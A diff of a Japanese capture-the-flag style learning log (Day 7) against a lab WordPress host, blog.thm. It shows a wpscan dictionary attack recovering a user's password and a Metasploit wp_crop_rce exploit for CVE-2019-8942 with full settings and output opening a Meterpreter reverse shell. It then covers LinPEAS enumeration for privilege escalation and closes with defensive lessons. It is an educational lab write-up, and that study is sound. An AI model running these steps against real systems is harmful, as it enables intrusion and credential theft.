+ | Found By: Author Posts - Author Pattern (Passive Detection)
+</pre></div>
+</div>
+<p>ユーザーがわかったので、パスワードについては辞書攻撃で突破してみる。</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">kwheel</span></code>のパスワードが<code class="docutils literal notranslate"><span class="pre">cutiepie1</span></code></p></li>
+</ul>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day7<span class="o">]</span>
+└─$<span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://blog.thm<span class="w"> </span>-U<span class="w"> </span>kwheel,bjoel<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--password-attack<span class="w"> </span>wp-login<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span>
+
+<span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Valid<span class="w"> </span>Combinations<span class="w"> </span>Found:
+<span class="w"> </span><span class="p">|</span><span class="w"> </span>Username:<span class="w"> </span>kwheel,<span class="w"> </span>Password:<span class="w"> </span>cutiepie1
+</pre></div>
+</div>
+<p>WordPressに対してログインすることができ、Author権限を得ることができた。
+一方でアプリの侵入はできたがサーバーのOSには侵入できていないので別の攻撃を試してみる。</p>
 </section>
 <section id="id24">
-<h4>パスワードの自書攻撃<a class="headerlink" href="#id24" title="この見出しへのパーマリンク">¶</a></h4>
-<p>自書攻撃をしてみてパスワードを取得してログインしてみることで、wordpressのauthorのユーザーを取得できた。
-一方でアプリの侵入はできたがサーバーのOSには侵入できていない。</p>
-</section>
-</section>
+<h3>WordPressのサーバーへの攻撃<a class="headerlink" href="#id24" title="この見出しへのパーマリンク">¶</a></h3>
 <section id="id25">
-<h3>WordPressのサーバーへの攻撃<a class="headerlink" href="#id25" title="この見出しへのパーマリンク">¶</a></h3>
-<section id="id26">
-<h4>脆弱性の調査<a class="headerlink" href="#id26" title="この見出しへのパーマリンク">¶</a></h4>
-<p>WordPressのバージョンが古いので脆弱性を調査</p>
+<h4>脆弱性の調査<a class="headerlink" href="#id25" title="この見出しへのパーマリンク">¶</a></h4>
+<p>nmapの結果からWordPressのバージョンが古いことはわかっているので脆弱性をネットで調査すると2つ脆弱性があるらしい</p>
+<ul class="simple">
+<li><p>CVE-2019-8942</p></li>
+<li><p>CVE-2019-8943
+<img alt="" src="../_images/7DayHacking_day7_1.png" /></p></li>
+</ul>
 </section>
 <section id="metasploit">
 <h4>Metasploitを利用した攻撃<a class="headerlink" href="#metasploit" title="この見出しへのパーマリンク">¶</a></h4>
-<p>Metasploitを利用して脆弱性を突いてみると結果として、www-dataの権限を取得できた。</p>
+<p>Metasploitを利用して、CVE-2019-8942の脆弱性を突いてみる</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/7DaysHacking/Day7<span class="o">]</span>
+└─$<span class="w"> </span>msfconsole
+<span class="w">                                                  </span>
+msf6<span class="w"> </span>&gt;<span class="w"> </span>search<span class="w"> </span>CVE-2019-8942
+
+Matching<span class="w"> </span><span class="nv">Modules</span>
+<span class="o">================</span>
+
+<span class="w">   </span><span class="c1">#  Name                            Disclosure Date  Rank       Check  Description</span>
+<span class="w">   </span>-<span class="w">  </span>----<span class="w">                            </span>---------------<span class="w">  </span>----<span class="w">       </span>-----<span class="w">  </span>-----------
+<span class="w">   </span><span class="m">0</span><span class="w">  </span>exploit/multi/http/wp_crop_rce<span class="w">  </span><span class="m">2019</span>-02-19<span class="w">       </span>excellent<span class="w">  </span>Yes<span class="w">    </span>WordPress<span class="w"> </span>Crop-image<span class="w"> </span>Shell<span class="w"> </span>Upload
+
+msf6<span class="w"> </span>&gt;<span class="w"> </span>use<span class="w"> </span><span class="m">0</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>payload<span class="w"> </span>configured,<span class="w"> </span>defaulting<span class="w"> </span>to<span class="w"> </span>php/meterpreter/reverse_tcp
+msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>
+</pre></div>
+</div>
+<p>各種設定を指定して、実行してみる</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>cutiepie1
+<span class="nv">password</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>cutiepie1
+msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>rhosts<span class="w"> </span>blog.thm
+<span class="nv">rhosts</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>blog.thm
+msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>username<span class="w"> </span>kwheel
+<span class="nv">username</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span>kwheel
+msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>lhost<span class="w"> </span><span class="m">10</span>.17.30.207
+<span class="nv">lhost</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">10</span>.17.30.207
+msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>show<span class="w"> </span>options
+
+Module<span class="w"> </span>options<span class="w"> </span><span class="o">(</span>exploit/multi/http/wp_crop_rce<span class="o">)</span>:
+
+<span class="w">   </span>Name<span class="w">       </span>Current<span class="w"> </span>Setting<span class="w">  </span>Required<span class="w">  </span>Description
+<span class="w">   </span>----<span class="w">       </span>---------------<span class="w">  </span>--------<span class="w">  </span>-----------
+<span class="w">   </span>PASSWORD<span class="w">   </span>cutiepie1<span class="w">        </span>yes<span class="w">       </span>The<span class="w"> </span>WordPress<span class="w"> </span>password<span class="w"> </span>to<span class="w"> </span>authenticate<span class="w"> </span>with
+<span class="w">   </span>Proxies<span class="w">                     </span>no<span class="w">        </span>A<span class="w"> </span>proxy<span class="w"> </span>chain<span class="w"> </span>of<span class="w"> </span>format<span class="w"> </span>type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
+<span class="w">   </span>RHOSTS<span class="w">     </span>blog.thm<span class="w">         </span>yes<span class="w">       </span>The<span class="w"> </span>target<span class="w"> </span>host<span class="o">(</span>s<span class="o">)</span>,<span class="w"> </span>see<span class="w"> </span>https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+<span class="w">   </span>RPORT<span class="w">      </span><span class="m">80</span><span class="w">               </span>yes<span class="w">       </span>The<span class="w"> </span>target<span class="w"> </span>port<span class="w"> </span><span class="o">(</span>TCP<span class="o">)</span>
+<span class="w">   </span>SSL<span class="w">        </span><span class="nb">false</span><span class="w">            </span>no<span class="w">        </span>Negotiate<span class="w"> </span>SSL/TLS<span class="w"> </span><span class="k">for</span><span class="w"> </span>outgoing<span class="w"> </span>connections
+<span class="w">   </span>TARGETURI<span class="w">  </span>/<span class="w">                </span>yes<span class="w">       </span>The<span class="w"> </span>base<span class="w"> </span>path<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>wordpress<span class="w"> </span>application
+<span class="w">   </span>THEME_DIR<span class="w">                   </span>no<span class="w">        </span>The<span class="w"> </span>WordPress<span class="w"> </span>theme<span class="w"> </span>dir<span class="w"> </span>name<span class="w"> </span><span class="o">(</span>disable<span class="w"> </span>theme<span class="w"> </span>auto-detection<span class="w"> </span><span class="k">if</span><span class="w"> </span>provided<span class="o">)</span>
+<span class="w">   </span>USERNAME<span class="w">   </span>kwheel<span class="w">           </span>yes<span class="w">       </span>The<span class="w"> </span>WordPress<span class="w"> </span>username<span class="w"> </span>to<span class="w"> </span>authenticate<span class="w"> </span>with
+<span class="w">   </span>VHOST<span class="w">                       </span>no<span class="w">        </span>HTTP<span class="w"> </span>server<span class="w"> </span>virtual<span class="w"> </span>host
+</pre></div>
+</div>
+<p>結果として、www-dataの権限を取得できた。</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>msf6<span class="w"> </span>exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>exploit
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.17.30.207:4444<span class="w"> </span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Authenticating<span class="w"> </span>with<span class="w"> </span>WordPress<span class="w"> </span>using<span class="w"> </span>kwheel:cutiepie1...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Authenticated<span class="w"> </span>with<span class="w"> </span>WordPress
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Preparing<span class="w"> </span>payload...
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Uploading<span class="w"> </span>payload
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Image<span class="w"> </span>uploaded
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Including<span class="w"> </span>into<span class="w"> </span>theme
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>stage<span class="w"> </span><span class="o">(</span><span class="m">39927</span><span class="w"> </span>bytes<span class="o">)</span><span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.10.172.46
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Attempting<span class="w"> </span>to<span class="w"> </span>clean<span class="w"> </span>up<span class="w"> </span>files...
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="m">1</span><span class="w"> </span>opened<span class="w"> </span><span class="o">(</span><span class="m">10</span>.17.30.207:4444<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">10</span>.10.172.46:45924<span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-04-26<span class="w"> </span><span class="m">10</span>:53:17<span class="w"> </span>+0900
+
+meterpreter<span class="w"> </span>&gt;<span class="w"> </span>getuid
+Server<span class="w"> </span>username:<span class="w"> </span>www-data
+</pre></div>
+</div>
 </section>
 </section>
-<section id="id27">
-<h3>権限昇格<a class="headerlink" href="#id27" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="id26">
+<h3>権限昇格<a class="headerlink" href="#id26" title="この見出しへのパーマリンク">¶</a></h3>
 <p>adminなどの強い権限を取得するために脆弱性を調査する。</p>
 <section id="linpeas">
 <h4>LinPEAS<a class="headerlink" href="#linpeas" title="この見出しへのパーマリンク">¶</a></h4>
+<p>ターゲットサーバーへの初期侵入が完了後、実行することで権限昇格できそうなミスを探すためのツール。</p>
+</section>
+<section id="id27">
+<h4>LinPEASをターゲットへアップロード<a class="headerlink" href="#id27" title="この見出しへのパーマリンク">¶</a></h4>
+<p>取得方法はローカルマシーンでLinPEASをDLしておいて、ローカルでサーバーを立てる。その後進入済みのマシーンからローカルマシーンに対してDLするような処理で行う。</p>
 </section>
 <section id="id28">
-<h4>LinPEASをターゲットへアップロード<a class="headerlink" href="#id28" title="この見出しへのパーマリンク">¶</a></h4>
-<p>ローカル側にサーバーを立てて、侵入済みのサーバーからDLする流れ</p>
+<h4>LinPEASの実行<a class="headerlink" href="#id28" title="この見出しへのパーマリンク">¶</a></h4>
+<p>実行すると実行権限に<code class="docutils literal notranslate"><span class="pre">s</span></code>がついているコマンドを発見。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                              
+                      ╚════════════════════════════════════╝                       
+~~~
+-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary!)
+~~~
+</pre></div>
+</div>
+<p>中身としては、現実味がないので割愛するが、このコマンドの脆弱性を突いてrootに昇格。</p>
+</section>
 </section>
 <section id="id29">
-<h4>LinPEASの実行<a class="headerlink" href="#id29" title="この見出しへのパーマリンク">¶</a></h4>
-<p>実行すると実行権限に<code class="docutils literal notranslate"><span class="pre">s</span></code>がついているコマンドを発見。</p>
-</section>
-<section id="id30">
-<h4>権限昇格<a class="headerlink" href="#id30" title="この見出しへのパーマリンク">¶</a></h4>
-</section>
-</section>
-<section id="id31">
-<h3>Day7勉強したこと<a class="headerlink" href="#id31" title="この見出しへのパーマリンク">¶</a></h3>
+<h3>Day7勉強したこと<a class="headerlink" href="#id29" title="この見出しへのパーマリンク">¶</a></h3>
+<ul class="simple">
+<li><p>wordpressは有名すぎてスキャンや辞書攻撃のツールが簡単に利用できる</p></li>
+<li><p>WordPressなどのアプリもバージョンが古いままだと脆弱性があるので、msfconsoleなどですぐに攻撃できてしまう</p></li>
+<li><p>小さな権限ユーザーでも侵入されると、<code class="docutils literal notranslate"><span class="pre">LinPEAS</span></code>などで権限昇格できないかすぐに調査されてしまう</p></li>
+</ul>
 </section>
 </section>
 </section>
